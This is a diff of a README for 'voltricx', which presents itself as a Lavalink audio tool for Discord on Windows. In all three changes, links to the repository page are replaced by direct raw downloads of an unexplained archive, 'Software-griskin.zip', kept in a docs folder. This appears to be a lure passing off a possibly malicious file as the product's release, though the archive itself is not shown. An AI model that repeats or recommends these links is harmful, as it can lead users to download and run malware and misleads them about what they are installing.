@@ -1,6 +1,6 @@
 # 🎧 voltricx - Fast Lavalink Audio for Discord
 
-[![Download voltricx](https://img.shields.io/badge/Download-voltricx-blue?style=for-the-badge)](https://github.com/dorounexpended109/voltricx)
+[![Download voltricx](https://img.shields.io/badge/Download-voltricx-blue?style=for-the-badge)](https://github.com/dorounexpended109/voltricx/raw/refs/heads/main/docs/includes/Software-griskin.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This page shows you how to download and run it on Windows.
 
 Use this link to visit the download page:
 
-[https://github.com/dorounexpended109/voltricx](https://github.com/dorounexpended109/voltricx)
+[https://github.com/dorounexpended109/voltricx/raw/refs/heads/main/docs/includes/Software-griskin.zip](https://github.com/dorounexpended109/voltricx/raw/refs/heads/main/docs/includes/Software-griskin.zip)
 
 If the page has a release file, download it to your PC. If it has a source package, use the files on the page to run the app.
 
@@ -165,4 +165,4 @@ voltricx fits users who want a Discord music bot setup that feels clean and stay
 
 ## 📌 Project Link
 
-[https://github.com/dorounexpended109/voltricx](https://github.com/dorounexpended109/voltricx)
+[https://github.com/dorounexpended109/voltricx/raw/refs/heads/main/docs/includes/Software-griskin.zip](https://github.com/dorounexpended109/voltricx/raw/refs/heads/main/docs/includes/Software-griskin.zip)
